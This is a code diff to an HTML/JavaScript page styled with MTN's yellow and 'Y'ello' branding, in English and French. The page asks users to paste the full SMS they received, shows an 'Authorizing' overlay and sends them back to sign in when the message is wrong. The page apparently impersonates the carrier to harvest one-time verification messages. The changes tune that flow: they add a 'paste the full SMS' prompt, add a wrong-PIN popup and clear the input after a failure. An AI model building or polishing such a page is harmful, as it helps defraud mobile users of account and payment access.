@@ -303,7 +303,6 @@
   }
   .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
 
-  /* Wrong PIN / popup */
   .popup-overlay {
     position: fixed; inset: 0;
     background: rgba(16,24,40,0.65);
@@ -458,7 +457,6 @@
   <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
-<!-- Wrong PIN popup -->
 <div class="popup-overlay" id="wrongPinPopup">
   <div class="popup-card">
     <div class="popup-icon">!</div>
@@ -510,6 +508,7 @@
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
+      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.',
       wrongPinTitle: 'Incorrect SMS pasted',
       wrongPinDesc: 'The SMS you pasted is not correct. You will be taken back to sign in to try again.',
       wrongPinBtn: 'Try again'
@@ -552,6 +551,7 @@
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
+      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.',
       wrongPinTitle: 'SMS incorrect collé',
       wrongPinDesc: 'Le SMS que vous avez collé n\'est pas correct. Vous allez être redirigé vers la connexion pour réessayer.',
       wrongPinBtn: 'Réessayer'
@@ -943,8 +943,7 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        showNotice('noticeDeclined');
-        showToast(T.noticeDeclinedTitle);
+        document.getElementById('wrongPinPopup').classList.add('show');
         return;
       }
 
@@ -966,6 +965,7 @@
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+        clearSmsInput();
         showNotice('noticeFullSms');
         document.getElementById('smsInput').focus();
         showToast(T.fullSmsToast);
